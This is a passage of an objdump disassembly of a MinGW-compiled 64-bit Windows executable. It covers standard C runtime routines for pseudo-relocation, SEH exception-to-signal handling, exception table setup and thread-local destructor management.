  407759:	48 83 c6 0c          	add    $0xc,%rsi
  40775d:	0f 1f 00             	nopl   (%rax)
  407760:	85 d2                	test   %edx,%edx
  407762:	0f 85 38 ff ff ff    	jne    4076a0 <_pei386_runtime_relocator+0xa0>
  407768:	8b 46 04             	mov    0x4(%rsi),%eax
  40776b:	85 c0                	test   %eax,%eax
  40776d:	0f 85 2d ff ff ff    	jne    4076a0 <_pei386_runtime_relocator+0xa0>
  407773:	8b 56 08             	mov    0x8(%rsi),%edx
  407776:	83 fa 01             	cmp    $0x1,%edx
  407779:	0f 85 2f 01 00 00    	jne    4078ae <_pei386_runtime_relocator+0x2ae>
  40777f:	4c 8b 2d 7a a5 00 00 	mov    0xa57a(%rip),%r13        # 411d00 <.refptr.__image_base__>
  407786:	48 83 c6 0c          	add    $0xc,%rsi
  40778a:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
  407791:	ff ff ff 
  407794:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
  407798:	4c 39 e6             	cmp    %r12,%rsi
  40779b:	72 48                	jb     4077e5 <_pei386_runtime_relocator+0x1e5>
  40779d:	e9 80 fe ff ff       	jmp    407622 <_pei386_runtime_relocator+0x22>
  4077a2:	0f 86 b8 00 00 00    	jbe    407860 <_pei386_runtime_relocator+0x260>
  4077a8:	83 fa 20             	cmp    $0x20,%edx
  4077ab:	0f 84 7f 00 00 00    	je     407830 <_pei386_runtime_relocator+0x230>
  4077b1:	83 fa 40             	cmp    $0x40,%edx
  4077b4:	0f 85 e0 00 00 00    	jne    40789a <_pei386_runtime_relocator+0x29a>
  4077ba:	48 8b 11             	mov    (%rcx),%rdx
  4077bd:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4077c3:	4c 89 f7             	mov    %r14,%rdi
  4077c6:	48 29 c2             	sub    %rax,%rdx
  4077c9:	4c 01 ca             	add    %r9,%rdx
  4077cc:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  4077d0:	4c 89 f2             	mov    %r14,%rdx
  4077d3:	e8 58 fc ff ff       	call   407430 <__write_memory.part.0>
  4077d8:	48 83 c6 0c          	add    $0xc,%rsi
  4077dc:	4c 39 e6             	cmp    %r12,%rsi
  4077df:	0f 83 12 ff ff ff    	jae    4076f7 <_pei386_runtime_relocator+0xf7>
  4077e5:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4077e8:	8b 06                	mov    (%rsi),%eax
  4077ea:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
  4077ee:	4c 01 e9             	add    %r13,%rcx
  4077f1:	4c 01 e8             	add    %r13,%rax
  4077f4:	83 fa 10             	cmp    $0x10,%edx
  4077f7:	4c 8b 08             	mov    (%rax),%r9
  4077fa:	75 a6                	jne    4077a2 <_pei386_runtime_relocator+0x1a2>
  4077fc:	44 0f b7 01          	movzwl (%rcx),%r8d
  407800:	4c 89 f2             	mov    %r14,%rdx
  407803:	4c 89 f7             	mov    %r14,%rdi
  407806:	4d 89 c2             	mov    %r8,%r10
  407809:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  407810:	66 45 85 c0          	test   %r8w,%r8w
  407814:	4d 0f 48 c2          	cmovs  %r10,%r8
  407818:	49 29 c0             	sub    %rax,%r8
  40781b:	4d 01 c8             	add    %r9,%r8
  40781e:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  407822:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  407828:	e8 03 fc ff ff       	call   407430 <__write_memory.part.0>
  40782d:	eb a9                	jmp    4077d8 <_pei386_runtime_relocator+0x1d8>
  40782f:	90                   	nop
  407830:	8b 11                	mov    (%rcx),%edx
  407832:	4c 89 f7             	mov    %r14,%rdi
  407835:	49 89 d0             	mov    %rdx,%r8
  407838:	4c 09 fa             	or     %r15,%rdx
  40783b:	45 85 c0             	test   %r8d,%r8d
  40783e:	49 0f 49 d0          	cmovns %r8,%rdx
  407842:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  407848:	48 29 c2             	sub    %rax,%rdx
  40784b:	4c 01 ca             	add    %r9,%rdx
  40784e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  407852:	4c 89 f2             	mov    %r14,%rdx
  407855:	e8 d6 fb ff ff       	call   407430 <__write_memory.part.0>
  40785a:	e9 79 ff ff ff       	jmp    4077d8 <_pei386_runtime_relocator+0x1d8>
  40785f:	90                   	nop
  407860:	83 fa 08             	cmp    $0x8,%edx
  407863:	75 35                	jne    40789a <_pei386_runtime_relocator+0x29a>
  407865:	44 0f b6 01          	movzbl (%rcx),%r8d
  407869:	4c 89 f2             	mov    %r14,%rdx
  40786c:	4c 89 f7             	mov    %r14,%rdi
  40786f:	4d 89 c2             	mov    %r8,%r10
  407872:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  407879:	45 84 c0             	test   %r8b,%r8b
  40787c:	4d 0f 48 c2          	cmovs  %r10,%r8
  407880:	49 29 c0             	sub    %rax,%r8
  407883:	4d 01 c8             	add    %r9,%r8
  407886:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  40788a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  407890:	e8 9b fb ff ff       	call   407430 <__write_memory.part.0>
  407895:	e9 3e ff ff ff       	jmp    4077d8 <_pei386_runtime_relocator+0x1d8>
  40789a:	48 8d 0d b7 a3 00 00 	lea    0xa3b7(%rip),%rcx        # 411c58 <.rdata+0xd8>
  4078a1:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  4078a8:	00 
  4078a9:	e8 c2 28 00 00       	call   40a170 <__report_error>
  4078ae:	48 8d 0d 6b a3 00 00 	lea    0xa36b(%rip),%rcx        # 411c20 <.rdata+0xa0>
  4078b5:	e8 b6 28 00 00       	call   40a170 <__report_error>
  4078ba:	90                   	nop
  4078bb:	90                   	nop
  4078bc:	90                   	nop
  4078bd:	90                   	nop
  4078be:	90                   	nop
  4078bf:	90                   	nop

00000000004078c0 <__mingw_SEH_error_handler>:
  4078c0:	48 83 ec 28          	sub    $0x28,%rsp
  4078c4:	8b 01                	mov    (%rcx),%eax
  4078c6:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  4078cb:	77 63                	ja     407930 <__mingw_SEH_error_handler+0x70>
  4078cd:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  4078d2:	73 7b                	jae    40794f <__mingw_SEH_error_handler+0x8f>
  4078d4:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  4078d9:	0f 84 05 01 00 00    	je     4079e4 <__mingw_SEH_error_handler+0x124>
  4078df:	0f 87 cb 00 00 00    	ja     4079b0 <__mingw_SEH_error_handler+0xf0>
  4078e5:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4078ea:	0f 84 f4 00 00 00    	je     4079e4 <__mingw_SEH_error_handler+0x124>
  4078f0:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4078f5:	0f 85 c3 00 00 00    	jne    4079be <__mingw_SEH_error_handler+0xfe>
  4078fb:	31 d2                	xor    %edx,%edx
  4078fd:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407902:	e8 f9 0a 00 00       	call   408400 <signal>
  407907:	48 83 f8 01          	cmp    $0x1,%rax
  40790b:	0f 84 2f 01 00 00    	je     407a40 <__mingw_SEH_error_handler+0x180>
  407911:	48 85 c0             	test   %rax,%rax
  407914:	0f 84 3c 01 00 00    	je     407a56 <__mingw_SEH_error_handler+0x196>
  40791a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40791f:	ff d0                	call   *%rax
  407921:	31 c0                	xor    %eax,%eax
  407923:	48 83 c4 28          	add    $0x28,%rsp
  407927:	c3                   	ret
  407928:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40792f:	00 
  407930:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  407935:	0f 84 b5 00 00 00    	je     4079f0 <__mingw_SEH_error_handler+0x130>
  40793b:	77 37                	ja     407974 <__mingw_SEH_error_handler+0xb4>
  40793d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  407942:	0f 84 9c 00 00 00    	je     4079e4 <__mingw_SEH_error_handler+0x124>
  407948:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40794d:	75 6f                	jne    4079be <__mingw_SEH_error_handler+0xfe>
  40794f:	31 d2                	xor    %edx,%edx
  407951:	b9 08 00 00 00       	mov    $0x8,%ecx
  407956:	e8 a5 0a 00 00       	call   408400 <signal>
  40795b:	48 83 f8 01          	cmp    $0x1,%rax
  40795f:	74 6f                	je     4079d0 <__mingw_SEH_error_handler+0x110>
  407961:	48 85 c0             	test   %rax,%rax
  407964:	74 58                	je     4079be <__mingw_SEH_error_handler+0xfe>
  407966:	b9 08 00 00 00       	mov    $0x8,%ecx
  40796b:	ff d0                	call   *%rax
  40796d:	31 c0                	xor    %eax,%eax
  40796f:	48 83 c4 28          	add    $0x28,%rsp
  407973:	c3                   	ret
  407974:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  407979:	74 69                	je     4079e4 <__mingw_SEH_error_handler+0x124>
  40797b:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  407980:	75 3c                	jne    4079be <__mingw_SEH_error_handler+0xfe>
  407982:	31 d2                	xor    %edx,%edx
  407984:	b9 04 00 00 00       	mov    $0x4,%ecx
  407989:	e8 72 0a 00 00       	call   408400 <signal>
  40798e:	48 83 f8 01          	cmp    $0x1,%rax
  407992:	0f 84 88 00 00 00    	je     407a20 <__mingw_SEH_error_handler+0x160>
  407998:	48 85 c0             	test   %rax,%rax
  40799b:	0f 84 b5 00 00 00    	je     407a56 <__mingw_SEH_error_handler+0x196>
  4079a1:	b9 04 00 00 00       	mov    $0x4,%ecx
  4079a6:	ff d0                	call   *%rax
  4079a8:	31 c0                	xor    %eax,%eax
  4079aa:	48 83 c4 28          	add    $0x28,%rsp
  4079ae:	c3                   	ret
  4079af:	90                   	nop
  4079b0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  4079b5:	74 cb                	je     407982 <__mingw_SEH_error_handler+0xc2>
  4079b7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  4079bc:	74 26                	je     4079e4 <__mingw_SEH_error_handler+0x124>
  4079be:	b8 01 00 00 00       	mov    $0x1,%eax
  4079c3:	48 83 c4 28          	add    $0x28,%rsp
  4079c7:	c3                   	ret
  4079c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4079cf:	00 
  4079d0:	ba 01 00 00 00       	mov    $0x1,%edx
  4079d5:	b9 08 00 00 00       	mov    $0x8,%ecx
  4079da:	e8 21 0a 00 00       	call   408400 <signal>
  4079df:	e8 1c fa ff ff       	call   407400 <_fpreset>
  4079e4:	31 c0                	xor    %eax,%eax
  4079e6:	48 83 c4 28          	add    $0x28,%rsp
  4079ea:	c3                   	ret
  4079eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4079f0:	31 d2                	xor    %edx,%edx
  4079f2:	b9 08 00 00 00       	mov    $0x8,%ecx
  4079f7:	e8 04 0a 00 00       	call   408400 <signal>
  4079fc:	48 83 f8 01          	cmp    $0x1,%rax
  407a00:	0f 85 5b ff ff ff    	jne    407961 <__mingw_SEH_error_handler+0xa1>
  407a06:	ba 01 00 00 00       	mov    $0x1,%edx
  407a0b:	b9 08 00 00 00       	mov    $0x8,%ecx
  407a10:	e8 eb 09 00 00       	call   408400 <signal>
  407a15:	31 c0                	xor    %eax,%eax
  407a17:	e9 07 ff ff ff       	jmp    407923 <__mingw_SEH_error_handler+0x63>
  407a1c:	0f 1f 40 00          	nopl   0x0(%rax)
  407a20:	ba 01 00 00 00       	mov    $0x1,%edx
  407a25:	b9 04 00 00 00       	mov    $0x4,%ecx
  407a2a:	e8 d1 09 00 00       	call   408400 <signal>
  407a2f:	31 c0                	xor    %eax,%eax
  407a31:	e9 ed fe ff ff       	jmp    407923 <__mingw_SEH_error_handler+0x63>
  407a36:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  407a3d:	00 00 00 
  407a40:	ba 01 00 00 00       	mov    $0x1,%edx
  407a45:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407a4a:	e8 b1 09 00 00       	call   408400 <signal>
  407a4f:	31 c0                	xor    %eax,%eax
  407a51:	e9 cd fe ff ff       	jmp    407923 <__mingw_SEH_error_handler+0x63>
  407a56:	b8 04 00 00 00       	mov    $0x4,%eax
  407a5b:	e9 c3 fe ff ff       	jmp    407923 <__mingw_SEH_error_handler+0x63>

0000000000407a60 <__mingw_init_ehandler>:
  407a60:	41 54                	push   %r12
  407a62:	55                   	push   %rbp
  407a63:	57                   	push   %rdi
  407a64:	56                   	push   %rsi
  407a65:	53                   	push   %rbx
  407a66:	48 83 ec 20          	sub    $0x20,%rsp
  407a6a:	e8 91 07 00 00       	call   408200 <_GetPEImageBase>
  407a6f:	48 89 c5             	mov    %rax,%rbp
  407a72:	8b 05 d0 6d 02 00    	mov    0x26dd0(%rip),%eax        # 42e848 <was_here.95013>
  407a78:	85 c0                	test   %eax,%eax
  407a7a:	75 25                	jne    407aa1 <__mingw_init_ehandler+0x41>
  407a7c:	48 85 ed             	test   %rbp,%rbp
  407a7f:	74 20                	je     407aa1 <__mingw_init_ehandler+0x41>
  407a81:	48 8d 0d 08 a2 00 00 	lea    0xa208(%rip),%rcx        # 411c90 <.rdata>
  407a88:	c7 05 b6 6d 02 00 01 	movl   $0x1,0x26db6(%rip)        # 42e848 <was_here.95013>
  407a8f:	00 00 00 
  407a92:	e8 a9 05 00 00       	call   408040 <_FindPESectionByName>
  407a97:	48 85 c0             	test   %rax,%rax
  407a9a:	74 14                	je     407ab0 <__mingw_init_ehandler+0x50>
  407a9c:	b8 01 00 00 00       	mov    $0x1,%eax
  407aa1:	48 83 c4 20          	add    $0x20,%rsp
  407aa5:	5b                   	pop    %rbx
  407aa6:	5e                   	pop    %rsi
  407aa7:	5f                   	pop    %rdi
  407aa8:	5d                   	pop    %rbp
  407aa9:	41 5c                	pop    %r12
  407aab:	c3                   	ret
  407aac:	0f 1f 40 00          	nopl   0x0(%rax)
  407ab0:	48 8d 1d a9 6e 02 00 	lea    0x26ea9(%rip),%rbx        # 42e960 <emu_pdata>
  407ab7:	b9 30 00 00 00       	mov    $0x30,%ecx
  407abc:	31 f6                	xor    %esi,%esi
  407abe:	48 8d 15 9b 6d 02 00 	lea    0x26d9b(%rip),%rdx        # 42e860 <emu_xdata>
  407ac5:	48 89 df             	mov    %rbx,%rdi
  407ac8:	f3 48 ab             	rep stos %rax,(%rdi)
  407acb:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 4078c0 <__mingw_SEH_error_handler>
  407ad2:	b9 20 00 00 00       	mov    $0x20,%ecx
  407ad7:	48 89 d7             	mov    %rdx,%rdi
  407ada:	f3 48 ab             	rep stos %rax,(%rdi)
  407add:	49 29 ec             	sub    %rbp,%r12
  407ae0:	48 89 d7             	mov    %rdx,%rdi
  407ae3:	eb 2e                	jmp    407b13 <__mingw_init_ehandler+0xb3>
  407ae5:	c6 07 09             	movb   $0x9,(%rdi)
  407ae8:	48 83 c6 01          	add    $0x1,%rsi
  407aec:	48 83 c3 0c          	add    $0xc,%rbx
  407af0:	44 89 67 04          	mov    %r12d,0x4(%rdi)
  407af4:	8b 48 0c             	mov    0xc(%rax),%ecx
  407af7:	89 4b f4             	mov    %ecx,-0xc(%rbx)
  407afa:	03 48 08             	add    0x8(%rax),%ecx
  407afd:	48 89 f8             	mov    %rdi,%rax
  407b00:	48 83 c7 08          	add    $0x8,%rdi
  407b04:	48 29 e8             	sub    %rbp,%rax
  407b07:	89 43 fc             	mov    %eax,-0x4(%rbx)
  407b0a:	89 4b f8             	mov    %ecx,-0x8(%rbx)
  407b0d:	48 83 fe 20          	cmp    $0x20,%rsi
  407b11:	74 32                	je     407b45 <__mingw_init_ehandler+0xe5>
  407b13:	48 89 f1             	mov    %rsi,%rcx
  407b16:	e8 75 06 00 00       	call   408190 <_FindPESectionExec>
  407b1b:	48 85 c0             	test   %rax,%rax
  407b1e:	75 c5                	jne    407ae5 <__mingw_init_ehandler+0x85>
  407b20:	48 85 f6             	test   %rsi,%rsi
  407b23:	89 f2                	mov    %esi,%edx
  407b25:	0f 84 71 ff ff ff    	je     407a9c <__mingw_init_ehandler+0x3c>
  407b2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  407b30:	48 8d 0d 29 6e 02 00 	lea    0x26e29(%rip),%rcx        # 42e960 <emu_pdata>
  407b37:	49 89 e8             	mov    %rbp,%r8
  407b3a:	ff 15 94 07 04 00    	call   *0x40794(%rip)        # 4482d4 <__imp_RtlAddFunctionTable>
  407b40:	e9 57 ff ff ff       	jmp    407a9c <__mingw_init_ehandler+0x3c>
  407b45:	ba 20 00 00 00       	mov    $0x20,%edx
  407b4a:	eb e4                	jmp    407b30 <__mingw_init_ehandler+0xd0>
  407b4c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000407b50 <_gnu_exception_handler>:
  407b50:	53                   	push   %rbx
  407b51:	48 83 ec 20          	sub    $0x20,%rsp
  407b55:	48 8b 11             	mov    (%rcx),%rdx
  407b58:	8b 02                	mov    (%rdx),%eax
  407b5a:	48 89 cb             	mov    %rcx,%rbx
  407b5d:	89 c1                	mov    %eax,%ecx
  407b5f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  407b65:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  407b6b:	0f 84 bf 00 00 00    	je     407c30 <_gnu_exception_handler+0xe0>
  407b71:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  407b76:	77 68                	ja     407be0 <_gnu_exception_handler+0x90>
  407b78:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  407b7d:	73 7c                	jae    407bfb <_gnu_exception_handler+0xab>
  407b7f:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  407b84:	0f 84 b0 00 00 00    	je     407c3a <_gnu_exception_handler+0xea>
  407b8a:	0f 87 f4 00 00 00    	ja     407c84 <_gnu_exception_handler+0x134>
  407b90:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  407b95:	0f 84 9f 00 00 00    	je     407c3a <_gnu_exception_handler+0xea>
  407b9b:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  407ba0:	75 1f                	jne    407bc1 <_gnu_exception_handler+0x71>
  407ba2:	31 d2                	xor    %edx,%edx
  407ba4:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407ba9:	e8 52 08 00 00       	call   408400 <signal>
  407bae:	48 83 f8 01          	cmp    $0x1,%rax
  407bb2:	0f 84 51 01 00 00    	je     407d09 <_gnu_exception_handler+0x1b9>
  407bb8:	48 85 c0             	test   %rax,%rax
  407bbb:	0f 85 0f 01 00 00    	jne    407cd0 <_gnu_exception_handler+0x180>
  407bc1:	48 8b 05 78 6c 02 00 	mov    0x26c78(%rip),%rax        # 42e840 <__mingw_oldexcpt_handler>
  407bc8:	48 85 c0             	test   %rax,%rax
  407bcb:	0f 84 10 01 00 00    	je     407ce1 <_gnu_exception_handler+0x191>
  407bd1:	48 89 d9             	mov    %rbx,%rcx
  407bd4:	48 83 c4 20          	add    $0x20,%rsp
  407bd8:	5b                   	pop    %rbx
  407bd9:	48 ff e0             	rex.W jmp *%rax
  407bdc:	0f 1f 40 00          	nopl   0x0(%rax)
  407be0:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  407be5:	0f 84 b5 00 00 00    	je     407ca0 <_gnu_exception_handler+0x150>
  407beb:	77 58                	ja     407c45 <_gnu_exception_handler+0xf5>
  407bed:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  407bf2:	74 46                	je     407c3a <_gnu_exception_handler+0xea>
  407bf4:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  407bf9:	75 c6                	jne    407bc1 <_gnu_exception_handler+0x71>
  407bfb:	31 d2                	xor    %edx,%edx
  407bfd:	b9 08 00 00 00       	mov    $0x8,%ecx
  407c02:	e8 f9 07 00 00       	call   408400 <signal>
  407c07:	48 83 f8 01          	cmp    $0x1,%rax
  407c0b:	0f 84 df 00 00 00    	je     407cf0 <_gnu_exception_handler+0x1a0>
  407c11:	48 85 c0             	test   %rax,%rax
  407c14:	74 ab                	je     407bc1 <_gnu_exception_handler+0x71>
  407c16:	b9 08 00 00 00       	mov    $0x8,%ecx
  407c1b:	ff d0                	call   *%rax
  407c1d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c22:	48 83 c4 20          	add    $0x20,%rsp
  407c26:	5b                   	pop    %rbx
  407c27:	c3                   	ret
  407c28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407c2f:	00 
  407c30:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  407c34:	0f 85 37 ff ff ff    	jne    407b71 <_gnu_exception_handler+0x21>
  407c3a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c3f:	48 83 c4 20          	add    $0x20,%rsp
  407c43:	5b                   	pop    %rbx
  407c44:	c3                   	ret
  407c45:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  407c4a:	74 ee                	je     407c3a <_gnu_exception_handler+0xea>
  407c4c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  407c51:	0f 85 6a ff ff ff    	jne    407bc1 <_gnu_exception_handler+0x71>
  407c57:	31 d2                	xor    %edx,%edx
  407c59:	b9 04 00 00 00       	mov    $0x4,%ecx
  407c5e:	e8 9d 07 00 00       	call   408400 <signal>
  407c63:	48 83 f8 01          	cmp    $0x1,%rax
  407c67:	0f 84 b3 00 00 00    	je     407d20 <_gnu_exception_handler+0x1d0>
  407c6d:	48 85 c0             	test   %rax,%rax
  407c70:	0f 84 4b ff ff ff    	je     407bc1 <_gnu_exception_handler+0x71>
  407c76:	b9 04 00 00 00       	mov    $0x4,%ecx
  407c7b:	ff d0                	call   *%rax
  407c7d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c82:	eb 9e                	jmp    407c22 <_gnu_exception_handler+0xd2>
  407c84:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  407c89:	74 cc                	je     407c57 <_gnu_exception_handler+0x107>
  407c8b:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  407c90:	0f 85 2b ff ff ff    	jne    407bc1 <_gnu_exception_handler+0x71>
  407c96:	eb a2                	jmp    407c3a <_gnu_exception_handler+0xea>
  407c98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407c9f:	00 
  407ca0:	31 d2                	xor    %edx,%edx
  407ca2:	b9 08 00 00 00       	mov    $0x8,%ecx
  407ca7:	e8 54 07 00 00       	call   408400 <signal>
  407cac:	48 83 f8 01          	cmp    $0x1,%rax
  407cb0:	0f 85 5b ff ff ff    	jne    407c11 <_gnu_exception_handler+0xc1>
  407cb6:	ba 01 00 00 00       	mov    $0x1,%edx
  407cbb:	b9 08 00 00 00       	mov    $0x8,%ecx
  407cc0:	e8 3b 07 00 00       	call   408400 <signal>
  407cc5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407cca:	e9 53 ff ff ff       	jmp    407c22 <_gnu_exception_handler+0xd2>
  407ccf:	90                   	nop
  407cd0:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407cd5:	ff d0                	call   *%rax
  407cd7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407cdc:	e9 41 ff ff ff       	jmp    407c22 <_gnu_exception_handler+0xd2>
  407ce1:	31 c0                	xor    %eax,%eax
  407ce3:	e9 3a ff ff ff       	jmp    407c22 <_gnu_exception_handler+0xd2>
  407ce8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407cef:	00 
  407cf0:	ba 01 00 00 00       	mov    $0x1,%edx
  407cf5:	b9 08 00 00 00       	mov    $0x8,%ecx
  407cfa:	e8 01 07 00 00       	call   408400 <signal>
  407cff:	e8 fc f6 ff ff       	call   407400 <_fpreset>
  407d04:	e9 31 ff ff ff       	jmp    407c3a <_gnu_exception_handler+0xea>
  407d09:	ba 01 00 00 00       	mov    $0x1,%edx
  407d0e:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407d13:	e8 e8 06 00 00       	call   408400 <signal>
  407d18:	83 c8 ff             	or     $0xffffffff,%eax
  407d1b:	e9 02 ff ff ff       	jmp    407c22 <_gnu_exception_handler+0xd2>
  407d20:	ba 01 00 00 00       	mov    $0x1,%edx
  407d25:	b9 04 00 00 00       	mov    $0x4,%ecx
  407d2a:	e8 d1 06 00 00       	call   408400 <signal>
  407d2f:	83 c8 ff             	or     $0xffffffff,%eax
  407d32:	e9 eb fe ff ff       	jmp    407c22 <_gnu_exception_handler+0xd2>
  407d37:	90                   	nop
  407d38:	90                   	nop
  407d39:	90                   	nop
  407d3a:	90                   	nop
  407d3b:	90                   	nop
  407d3c:	90                   	nop
  407d3d:	90                   	nop
  407d3e:	90                   	nop
  407d3f:	90                   	nop

0000000000407d40 <__mingwthr_run_key_dtors.part.0>:
  407d40:	55                   	push   %rbp
  407d41:	57                   	push   %rdi
  407d42:	56                   	push   %rsi
  407d43:	53                   	push   %rbx
  407d44:	48 83 ec 28          	sub    $0x28,%rsp
  407d48:	48 8d 0d b1 6d 02 00 	lea    0x26db1(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407d4f:	ff 15 17 05 04 00    	call   *0x40517(%rip)        # 44826c <__imp_EnterCriticalSection>
  407d55:	48 8b 1d 84 6d 02 00 	mov    0x26d84(%rip),%rbx        # 42eae0 <key_dtor_list>
  407d5c:	48 85 db             	test   %rbx,%rbx
  407d5f:	74 33                	je     407d94 <__mingwthr_run_key_dtors.part.0+0x54>
  407d61:	48 8b 2d b4 05 04 00 	mov    0x405b4(%rip),%rbp        # 44831c <__imp_TlsGetValue>
  407d68:	48 8b 3d 1d 05 04 00 	mov    0x4051d(%rip),%rdi        # 44828c <__imp_GetLastError>
  407d6f:	90                   	nop
  407d70:	8b 0b                	mov    (%rbx),%ecx
  407d72:	ff d5                	call   *%rbp
  407d74:	48 89 c6             	mov    %rax,%rsi
  407d77:	ff d7                	call   *%rdi
  407d79:	85 c0                	test   %eax,%eax
  407d7b:	75 0e                	jne    407d8b <__mingwthr_run_key_dtors.part.0+0x4b>
  407d7d:	48 85 f6             	test   %rsi,%rsi
  407d80:	74 09                	je     407d8b <__mingwthr_run_key_dtors.part.0+0x4b>
  407d82:	48 8b 43 08          	mov    0x8(%rbx),%rax
  407d86:	48 89 f1             	mov    %rsi,%rcx
  407d89:	ff d0                	call   *%rax
  407d8b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  407d8f:	48 85 db             	test   %rbx,%rbx
  407d92:	75 dc                	jne    407d70 <__mingwthr_run_key_dtors.part.0+0x30>
  407d94:	48 8d 0d 65 6d 02 00 	lea    0x26d65(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407d9b:	48 83 c4 28          	add    $0x28,%rsp
  407d9f:	5b                   	pop    %rbx
  407da0:	5e                   	pop    %rsi
  407da1:	5f                   	pop    %rdi
  407da2:	5d                   	pop    %rbp
  407da3:	48 ff 25 12 05 04 00 	rex.W jmp *0x40512(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407daa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000407db0 <___w64_mingwthr_add_key_dtor>:
  407db0:	55                   	push   %rbp
  407db1:	57                   	push   %rdi
  407db2:	56                   	push   %rsi
  407db3:	53                   	push   %rbx
  407db4:	48 83 ec 28          	sub    $0x28,%rsp
  407db8:	8b 05 2a 6d 02 00    	mov    0x26d2a(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407dbe:	31 f6                	xor    %esi,%esi
  407dc0:	85 c0                	test   %eax,%eax
  407dc2:	89 cd                	mov    %ecx,%ebp
  407dc4:	48 89 d7             	mov    %rdx,%rdi
  407dc7:	75 0b                	jne    407dd4 <___w64_mingwthr_add_key_dtor+0x24>
  407dc9:	89 f0                	mov    %esi,%eax
  407dcb:	48 83 c4 28          	add    $0x28,%rsp
  407dcf:	5b                   	pop    %rbx
  407dd0:	5e                   	pop    %rsi
  407dd1:	5f                   	pop    %rdi
  407dd2:	5d                   	pop    %rbp
  407dd3:	c3                   	ret
  407dd4:	ba 18 00 00 00       	mov    $0x18,%edx
  407dd9:	b9 01 00 00 00       	mov    $0x1,%ecx
  407dde:	e8 65 06 00 00       	call   408448 <calloc>
  407de3:	48 85 c0             	test   %rax,%rax
  407de6:	48 89 c3             	mov    %rax,%rbx
  407de9:	74 3d                	je     407e28 <___w64_mingwthr_add_key_dtor+0x78>
  407deb:	89 28                	mov    %ebp,(%rax)
  407ded:	48 8d 0d 0c 6d 02 00 	lea    0x26d0c(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407df4:	48 89 78 08          	mov    %rdi,0x8(%rax)
  407df8:	ff 15 6e 04 04 00    	call   *0x4046e(%rip)        # 44826c <__imp_EnterCriticalSection>
  407dfe:	48 8b 05 db 6c 02 00 	mov    0x26cdb(%rip),%rax        # 42eae0 <key_dtor_list>
  407e05:	48 8d 0d f4 6c 02 00 	lea    0x26cf4(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e0c:	48 89 1d cd 6c 02 00 	mov    %rbx,0x26ccd(%rip)        # 42eae0 <key_dtor_list>
  407e13:	48 89 43 10          	mov    %rax,0x10(%rbx)
  407e17:	ff 15 9f 04 04 00    	call   *0x4049f(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407e1d:	89 f0                	mov    %esi,%eax
